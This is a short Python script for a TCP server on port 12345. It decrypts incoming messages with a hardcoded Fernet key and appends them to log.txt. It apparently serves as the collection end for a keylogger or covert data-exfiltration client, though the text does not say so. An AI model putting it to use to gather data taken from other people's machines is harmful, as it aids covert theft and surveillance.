from socket import *
from cryptography.fernet import Fernet

PORT = 12345
KEY = b'6717Ub-YB8Brvn2bnarriTULPLKpIcLhveFbsQ6okhM='
LOG_FILENAME = "log.txt"

def save_to_file(log):
    with open(LOG_FILENAME, "a") as f:
        print(log, file=f)
    print("[+] log saved to file")
    
if __name__ == "__main__":
    serverSocket = socket(AF_INET, SOCK_STREAM)
    serverSocket.bind(('', PORT))
    serverSocket.listen(1)

    try:
        file = open(LOG_FILENAME, "r+")
        file.truncate(0);
        file.close();
    except:
        pass

    fernet = Fernet(KEY)

    print("[+] server starting")

    while 1:
        try:
            connectionSocket, addr = serverSocket.accept()
            data = connectionSocket.recv(1024)
            data = fernet.decrypt(data).decode()
            print(data)
            save_to_file(data)
        except KeyboardInterrupt:
            print("[-] server stopping")
            break
